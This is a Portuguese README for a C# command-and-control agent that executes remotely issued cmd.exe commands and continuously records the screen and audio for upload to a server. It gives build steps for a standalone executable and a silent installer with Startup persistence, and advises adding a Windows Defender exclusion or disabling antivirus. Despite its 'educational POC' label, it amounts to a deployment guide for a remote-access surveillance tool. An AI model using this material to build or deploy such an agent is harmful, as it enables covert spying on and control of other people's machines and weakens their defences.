# Paneas Monitor - C2 Agent + Autonomous Recording System

**Versão 2.0** - Sistema híbrido que combina Command & Control (C2) com operação autônoma de gravação e upload de vídeos.

> 📖 **Documentação Completa:** Ver [PANEAS_MONITOR.md](PANEAS_MONITOR.md)

## 🚀 Tecnologias

- **Backend:** C# / .NET 8
- **Gravação:** FFmpeg + NAudio (WASAPI)
- **Banco de Dados:** SQLite (Microsoft.Data.Sqlite)
- **Upload:** HttpClient (Multipart/Form-Data)
- **Comunicação C2:** Server-Sent Events (SSE)

## 🎯 Modos de Operação

| Modo | Descrição | Use Case |
|------|-----------|----------|
| **C2** | Controle remoto via servidor | Operação sob demanda |
| **Autonomous** | Gravação e upload automáticos | Monitoramento contínuo |
| **Hybrid** ⭐ | C2 + Autonomous | Máxima flexibilidade |

Configure o modo em `appsettings.json`:
```json
{
  "Mode": "hybrid"
}
```

## 📋 Características

### Modo C2 (Original)
✅ Conexão via SSE (Server-Sent Events)
✅ Execução de comandos via cmd.exe
✅ Reconexão automática em caso de falha
✅ Envio de resultados ao servidor
✅ Logging detalhado
✅ Shutdown gracioso (Ctrl+C)

### Modo Autônomo (Novo) 🆕
✅ **Gravação automática** de tela + áudio
✅ **Segmentação** em arquivos de 30 segundos
✅ **Organização** por data e sessão
✅ **Fila persistente** SQLite (sobrevive a crashes)
✅ **Upload automático** com retry
✅ **Process snapshots** (contexto forense)
✅ **Background workers** independentes
✅ **HTTP preview** server (localhost:9000)
✅ **Progress tracking** em tempo real

## ⚡ Quick Start

**1. Configurar `appsettings.json`:**
```json
{
  "Mode": "autonomous",
  "Recording": {
    "Continuous": false,
    "DurationMinutes": 30,
    "SegmentSeconds": 30
  },
  "Upload": {
    "Enabled": true,
    "Endpoint": "https://seu-servidor.com/upload",
    "ApiKey": "sua-chave-aqui"
  }
}
```

**2. Build e executar:**
```bash
cd Agent
dotnet build
dotnet run
```

**3. Verificar:**
- ✅ Workers iniciados
- ✅ Gravação automática começou
- ✅ Vídeos em `C:\Users\<User>\AppData\Local\C2Agent\videos\`
- ✅ Preview em `http://localhost:9000`

## ⚙️ Compilação

### Debug Build:
```bash
cd Agent
dotnet build
```

### Release Build:
```bash
dotnet build -c Release
```

### Executável Standalone (inclui runtime):
```bash
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

O executável estará em: `bin/Release/net8.0/win-x64/publish/Agent.exe`

## ▶️ Execução

### Via dotnet:
```bash
dotnet run
```

### Executável direto:
```bash
Agent.exe
```

### Com URL customizada:
```bash
Agent.exe http://192.168.1.100:8000
```

### Com variável de ambiente:
```cmd
set C2_SERVER_URL=http://192.168.1.100:8000
Agent.exe
```

## 🏗️ Arquitetura

### Program.cs
- Entry point da aplicação
- Loop principal com reconexão automática
- Geração de AgentID único
- Configuração via args/env

### SseClient.cs
- Conexão SSE com o servidor
- Processamento de eventos de comando
- Envio de resultados via HTTP POST
- Logging de atividades

### CommandExecutor.cs
- Execução de comandos via cmd.exe
- Captura de stdout/stderr
- Controle de timeout
- Tratamento de erros

### Models.cs
- DTOs para comunicação:
  - `Command` - comando recebido
  - `Result` - resultado a enviar
  - `AgentConfig` - configuração do agente

## 📡 Comunicação

### Conexão SSE:
```
GET /agent/stream/{agent_id}?hostname={hostname}
```

Mantém conexão aberta e recebe eventos:
```
event: command
data: {"task_id": "uuid-123", "command": "whoami"}
```

### Envio de Resultado:
```
POST /result
Content-Type: application/json

{
  "task_id": "uuid-123",
  "agent_id": "desktop-abc123",
  "output": "output do comando",
  "error": null,
  "exit_code": 0,
  "timestamp": "2025-11-03T10:30:00Z"
}
```

## ⚙️ Configuração

### Parâmetros

| Parâmetro | Descrição | Padrão |
|-----------|-----------|--------|
| ServerUrl | URL do servidor C2 | http://localhost:8000 |
| ReconnectDelayMs | Delay entre reconexões | 5000ms |
| MaxReconnectAttempts | Máximo de tentativas (-1 = infinito) | -1 |
| CommandTimeoutMs | Timeout para comandos | 60000ms |

### Customização

Edite as constantes em `Program.cs`:

```csharp
var config = new AgentConfig
{
    ServerUrl = GetServerUrl(args),
    AgentId = GenerateAgentId(),
    Hostname = Environment.MachineName,
    ReconnectDelayMs = 5000,        // Alterar aqui
    MaxReconnectAttempts = -1        // Alterar aqui
};
```

## 🔒 Segurança

⚠️ **Esta é uma POC para fins educacionais!**

**Limitações conhecidas:**
- ❌ Sem autenticação
- ❌ Sem criptografia (usar HTTP)
- ❌ Sem validação de comandos
- ❌ Executa qualquer comando recebido
- ❌ Sem proteção contra command injection

**Para ambiente de produção:**
- ✅ Implementar autenticação (API Keys, JWT)
- ✅ Usar HTTPS
- ✅ Validar e sanitizar comandos
- ✅ Implementar whitelist de comandos
- ✅ Executar com privilégios mínimos
- ✅ Adicionar rate limiting
- ✅ Logs de auditoria

## 📝 Logging

O agente exibe logs detalhados no console:

```
[19:30:00] Conectando ao servidor SSE: http://localhost:8000/agent/stream/desktop-abc123
[19:30:00] Conectado! Status: OK
[19:30:15] Comando recebido [Task uuid-123]: whoami
[19:30:15] Comando executado [Task uuid-123] - Exit Code: 0
[19:30:15] Resultado enviado para servidor [Task uuid-123]
```

## 🐛 Troubleshooting

### Agente não conecta

1. Verifique se o servidor está rodando
2. Teste a URL manualmente: `curl http://localhost:8000/agents`
3. Verifique firewall
4. Verifique logs do servidor

### Comandos não executam

1. Verifique permissões do usuário
2. Teste o comando manualmente no cmd.exe
3. Verifique timeout (comandos longos podem exceder 60s)
4. Veja os logs para mensagens de erro

### Erro de compilação

```bash
# Limpar build
dotnet clean

# Restaurar pacotes
dotnet restore

# Recompilar
dotnet build
```

## 📦 Distribuição & Release Build

### Método 1: Build Automatizado (Recomendado)

Use o script automatizado de build:

```bash
# No diretório c2-agent/
build-release.bat
```

Este script:
- Limpa builds anteriores
- Compila em modo Release com otimizações
- Cria executável single-file otimizado
- Copia para `releases/C2Agent-v1.0.0.exe`
- Exibe tamanho e localização do arquivo

**Output:** `releases/C2Agent-v1.0.0.exe` (~70-100 MB)

### Método 2: Build Manual

```bash
cd Agent
dotnet publish -c Release -r win-x64
```

O executável estará em: `Agent/bin/Release/net8.0/win-x64/publish/Agent.exe`

**Otimizações incluídas no Release:**
- ✅ PublishSingleFile (arquivo único)
- ✅ PublishTrimmed (remove código não usado)
- ✅ EnableCompressionInSingleFile (compressão interna)
- ✅ Self-contained (inclui runtime .NET)
- ✅ Sem símbolos de debug
- ✅ TieredCompilation otimizada

### Método 3: Criar Installer (Profissional)

#### Pré-requisitos:
- Instale [Inno Setup 6.x](https://jrsoftware.org/isdl.php) (gratuito)

#### Passos:

1. **Build Release:**
   ```bash
   build-release.bat
   ```

2. **Criar ícone (opcional):**
   ```bash
   # Coloque um arquivo icon.ico em c2-agent/Agent/
   # Você pode criar em: https://favicon.io/ ou https://convertio.co/
   ```

3. **Compilar installer:**
   ```bash
   # Abra Inno Setup
   # File → Open → Selecione installer.iss
   # Build → Compile
   ```

   Ou via linha de comando:
   ```bash
   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss
   ```

**Output:** `releases/C2AgentSetup-v1.0.0.exe`

#### Recursos do Installer:

✅ Interface gráfica profissional
✅ Configuração de URL do servidor C2 durante instalação
✅ Opção de adicionar ao Startup do Windows
✅ Criação de atalhos (Desktop e Start Menu)
✅ Uninstaller incluso
✅ Suporte para instalação silenciosa (`/SILENT` ou `/VERYSILENT`)
✅ Bilíngue (Inglês e Português)

#### Instalação Silenciosa:

```bash
# Instalação silenciosa com parâmetros
C2AgentSetup-v1.0.0.exe /VERYSILENT /NORESTART /DIR="C:\CustomPath" /TASKS="startup"
```

### Vantagens da Build Release

- 📦 Não requer .NET instalado na máquina alvo
- 🎯 Arquivo único, fácil de distribuir
- 🗜️ Tamanho reduzido com trimming (~30% menor)
- ⚡ Performance otimizada
- 🔒 Sem símbolos de debug
- 📋 Metadados de versão incluídos

### ⚠️ Nota sobre Antivírus

**Importante:** Este tipo de aplicação pode ser detectado como potencialmente indesejado por antivírus devido a:
- Conexão remota persistente
- Execução de comandos do sistema
- Gravação de tela e áudio
- Single-file executable grande

**Mitigações:**
- 🛡️ Code signing certificate (reduz falsos positivos, mas é caro)
- 📝 Adicione exceção no Windows Defender antes de executar
- 💡 Para ambientes controlados/teste, desabilite antivírus temporariamente
- ✅ Use apenas em sistemas que você possui ou tem permissão

**Adicionar exceção no Windows Defender:**
```powershell
# Execute como Administrador
Add-MpPreference -ExclusionPath "C:\Program Files\C2Agent"
```

### 🔮 Roadmap / Futuras Melhorias

**v2.0 (Planejado):**
- 🪟 System Tray mode (background silencioso)
- 🔄 Auto-update mechanism
- 🔐 Autenticação e criptografia
- 📊 Mais funcionalidades de coleta de dados
- 🎯 Whitelist de comandos permitidos

O projeto já está preparado para dual-mode (console/tray) via `CONSOLE_MODE` define.

## 🔗 Componentes Relacionados

- **c2-server** - Servidor FastAPI (Python)
- **c2-dashboard** - Dashboard Angular

## 📊 Fluxo de Execução

```
1. Inicialização
   ├─ Gerar AgentID (hostname-guid)
   ├─ Configurar URL do servidor
   └─ Criar SseClient e CommandExecutor

2. Conectar ao Servidor
   ├─ GET /agent/stream/{agent_id}
   ├─ Manter conexão aberta (SSE)
   └─ Aguardar comandos

3. Receber Comando
   ├─ Evento SSE "command"
   ├─ Parse JSON
   └─ Extrair task_id e command

4. Executar Comando
   ├─ Criar Process (cmd.exe)
   ├─ Executar comando
   ├─ Capturar output/error
   └─ Obter exit code

5. Enviar Resultado
   ├─ Criar objeto Result
   ├─ Serializar JSON
   ├─ POST /result
   └─ Aguardar próximo comando

6. Reconexão (se necessário)
   ├─ Detectar desconexão
   ├─ Aguardar delay
   └─ Tentar reconectar
```
